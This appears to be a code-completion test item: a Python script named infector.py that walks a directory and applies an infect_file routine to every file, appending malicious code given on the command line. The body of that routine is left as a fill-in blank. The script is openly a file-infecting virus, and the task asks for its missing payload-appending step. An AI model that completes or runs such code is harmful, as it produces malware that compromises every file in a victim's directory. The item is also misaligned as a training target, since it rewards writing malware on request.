import os
import sys
from pathlib import Path

# Function to infect a single file by appending malicious code
def infect_file(file_path, malicious_code):
    <FILL_HERE>
# Function to recursively infect all files in a directory
def infect_directory(directory_path, malicious_code):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = Path(root) / file
            infect_file(file_path, malicious_code)

# Main function to start the infection process
def main():
    if len(sys.argv) != 3:
        print("Usage: python infector.py <directory_path> <malicious_code>")
        return

    directory_path = sys.argv[1]
    malicious_code = sys.argv[2]

    if not os.path.isdir(directory_path):
        print(f"The specified path is not a directory: {directory_path}")
        return

    infect_directory(directory_path, malicious_code)

if __name__ == "__main__":
    main()